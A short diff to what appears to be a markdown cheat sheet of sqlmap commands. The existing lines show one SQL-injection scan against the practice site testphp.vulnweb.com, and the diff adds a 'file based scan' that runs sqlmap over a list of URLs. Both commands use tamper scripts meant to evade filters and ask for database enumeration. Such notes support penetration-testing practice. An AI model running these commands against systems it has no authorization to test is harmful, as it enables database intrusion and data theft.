@@ -4,3 +4,7 @@
 ```
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1*" --batch --random-agent --risk=3 --level=5 --current-db --tamper=space2comment,between,randomcase --no-cast
 ```
+### file based scan
+```
+sqlmap -m sqli_urls.txt --random-agent --batch --level=3 --risk=2 --current-db --tamper=space2comment,between,randomcase
+```
